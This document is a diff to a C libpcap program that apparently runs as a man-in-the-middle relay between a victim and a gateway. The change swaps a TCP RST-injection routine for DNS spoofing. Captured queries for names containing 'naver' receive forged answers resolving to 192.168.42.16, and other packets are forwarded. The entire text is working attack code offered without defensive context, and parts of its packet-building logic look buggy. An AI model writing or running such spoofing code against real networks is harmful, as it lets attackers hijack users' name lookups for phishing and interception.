@@ -19,6 +19,8 @@
 #define PROTOCOL_TCP	6
 #define PROTOCOL_UDP	17
 
+#define UDP_PORT_DNS	53
+
 #define _TEST_CASE_3
 //#define __DEBUG
 
@@ -71,6 +73,49 @@ struct tcp_header
 	uint16_t	window;					// (16Bit)		Window Size Value
 	uint16_t	checksum;				// (16Bit)		TCP Header Checksum
 	uint16_t	urgent;					// (16Bit)		Urgent Pointer
+};
+#pragma pack(pop)
+
+#pragma pack(push, 1)
+struct udp_header
+{
+	uint16_t	src_port;				// (16Bit)		Source Port
+	uint16_t	dst_port;				// (16Bit)		Destination Port
+	uint16_t	udp_len;				// (16Bit)		UDP + Data Length
+	uint16_t	checksum;				// (16Bit)		UDP Header Checksum
+};
+#pragma pack(pop)
+
+#pragma pack(push, 1)
+struct dns_header
+{
+	uint16_t	trans_id;				// (16Bit)
+	uint16_t	flags;					// (16Bit)
+	uint16_t	questions;				// (16Bit)
+	uint16_t	answer;					// (16Bit)
+	uint16_t	auth;					// (16Bit)
+	uint16_t	add;					// (16Bit)
+};
+#pragma pack(pop)
+
+#pragma pack(push, 1)
+struct dns_questions
+{
+	//uint8_t*	name;
+	uint16_t	type;
+	uint16_t	q_class;
+};
+#pragma pack(pop)
+
+#pragma pack(push, 1)
+struct dns_answer
+{
+	uint16_t	name;
+	uint16_t	type;
+	uint16_t	q_class;
+	uint32_t	ttl;
+	uint16_t	data_len;
+	uint8_t		addr[IP_LEN];
 };
 #pragma pack(pop)
 
@@ -182,7 +227,7 @@ int main(void)
 	pcap_pkthdr header;
 	uint8_t* data;
 
-	
+
 
 	for (;;)
 	{
@@ -202,53 +247,93 @@ int main(void)
 			}
 		}*/
 
+		
+
 		if ((data = (uint8_t*)pcap_next(_info._dev_handle, &header)) != NULL)
 		{
+			bool is_forward = true;
+
 			struct ether_header* pEth;
 			pEth = (struct ether_header*)data;
+			int dataPointer = sizeof(*pEth);
 
 			struct ip_header* pIp;
-			pIp = (struct ip_header*)(data + sizeof(*pEth));
+			pIp = (struct ip_header*)(data + dataPointer);
+			dataPointer += sizeof(*pIp);
 
-			if (pIp->protocol == PROTOCOL_TCP)
+			if (pIp->protocol == PROTOCOL_UDP)
 			{
-				struct tcp_header* pTcp;
-				pTcp = (struct tcp_header*)(data + sizeof(*pEth) + sizeof(*pIp));
+				struct udp_header* pUdp;
+				pUdp = (struct udp_header*)(data + dataPointer);
+				dataPointer += sizeof(*pUdp);
 
-				tcp_header_flags tcp_flags;
-				tcp_flags_check(ntohs(pTcp->flags), &tcp_flags);
-
-				// SYN(3-Way Handshaking 1st step)
-				if ((tcp_flags.syn == true) && (tcp_flags.ack == false))
+				if (ntohs(pUdp->dst_port) == UDP_PORT_DNS)
 				{
-					set_host(_info.v_host, pEth->dst_host);
-					set_host(_info.g_host, pEth->src_host);
-					pEth->ether_type = htons(ETHERTYPE_IP);
-					memcpy(data, pEth, sizeof(*pEth));
+					struct dns_header* pDns;
+					pDns = (struct dns_header*)(data + dataPointer);
+					dataPointer += sizeof(*pDns);
 
-					memcpy(pIp->src_ip, pIp->dst_ip, sizeof(pIp->src_ip));
-					set_ip(_info.v_ip, pIp->dst_ip);
-					pIp->total_len = htons(sizeof(*pIp) + sizeof(*pTcp));
-					ip_checksum(pIp);
-					memcpy(data + sizeof(*pEth), pIp, header.len - sizeof(*pEth));
+					struct dns_questions quest;
+					uint8_t* name = (data + dataPointer);
+					if (strstr((char*)name, "naver"))
+					{
+						struct dns_answer answer;
 
-					uint16_t tport = pTcp->src_port;
-					pTcp->src_port = pTcp->dst_port;
-					pTcp->dst_port = tport;
-					pTcp->ack = htonl(ntohl(pTcp->seq) + 1);
-					pTcp->seq = htonl(0x32163411);	// Random
-					pTcp->flags = htons(0x5014);	// RST, ACK
-					tcp_checksum(pIp, pTcp);
-					//TcpheaderChecksum(pIp, pTcp);
+						// Backwarding
+						uint8_t test[5000] = { 0 };
+						set_host(_info.v_host, pEth->dst_host);
+						set_host(_info.g_host, pEth->src_host);
+						pEth->ether_type = htons(ETHERTYPE_IP);
+						memcpy(test, pEth, sizeof(*pEth));
+						dataPointer = sizeof(*pEth);
 
-					// TODO : flags, checksum
-					memcpy(data + sizeof(*pEth) + sizeof(*pIp), pTcp, header.len - (sizeof(*pEth) + sizeof(*pIp)));
+						memcpy(pIp->src_ip, pIp->dst_ip, sizeof(pIp->src_ip));
+						set_ip(_info.v_ip, pIp->dst_ip);
+						pIp->total_len = htons(sizeof(*pIp) + sizeof(*pUdp) + sizeof(*pDns) + strlen((char*)name) + sizeof(quest) + sizeof(answer) + 1);
+						ip_checksum(pIp);
+						memcpy(test + dataPointer, pIp, sizeof(*pIp));
+						dataPointer += sizeof(*pIp);
 
-					// Backwarding
-					pcap_sendpacket(_info._dev_handle, data, sizeof(*pEth) + sizeof(*pIp) + sizeof(*pTcp));
+						uint16_t tport = pUdp->src_port;
+						pUdp->src_port = pUdp->dst_port;
+						pUdp->dst_port = tport;
+						pUdp->udp_len += 16;
+						pUdp->udp_len = htons(sizeof(*pUdp) + sizeof(*pDns) + strlen((char*)name) + sizeof(quest) + sizeof(answer) + 1);
+						memcpy(test + dataPointer, pUdp, sizeof(*pUdp));
+						dataPointer += sizeof(*pUdp);
+
+						pDns->flags = htons(0x8180);
+						pDns->questions = htons(0x0001);
+						pDns->answer = htons(0x0001);
+						pDns->auth = htons(0x0000);
+						pDns->add = htons(0x0000);
+						memcpy(test + dataPointer, pDns, sizeof(*pDns));
+						dataPointer += sizeof(*pDns);
+
+						quest.q_class = htons(0x0001);
+						quest.type = htons(0x0001);
+						strcat((char*)(test + dataPointer), (char*)name);
+						dataPointer += strlen((char*)name);
+						test[dataPointer++] = 0;
+						memcpy(test + dataPointer, &quest, sizeof(quest));
+						dataPointer += sizeof(quest);
+
+						answer.name = htons(0xc00c);
+						answer.type = htons(0x0001);
+						answer.q_class = htons(0x0001);
+						answer.ttl = htonl(0x0000000e);
+						answer.data_len = htons(0x0004);
+						set_ip("192.168.42.16", answer.addr);
+						memcpy(test + dataPointer, &answer, sizeof(answer));
+						dataPointer += sizeof(answer);
+
+						printf("Backwarding\n");
+						pcap_sendpacket(_info._dev_handle, test, dataPointer);
+						is_forward = false;
+					}
 				}
 			}
-			else
+			if (is_forward)
 			{
 				set_host(_info.g_host, pEth->dst_host);
 				set_host(_info.a_host, pEth->src_host);
@@ -301,10 +386,11 @@ int main(void)
 					pIp->src_ip[0], pIp->src_ip[1], pIp->src_ip[2], pIp->src_ip[3]);
 				printf("Destination IP Addr : %u.%u.%u.%u\n\n",
 					pIp->dst_ip[0], pIp->dst_ip[1], pIp->dst_ip[2], pIp->dst_ip[3]);
-		}
+			}
 #endif
+		}
+
 	}
-}
 	return 0;
 }
 
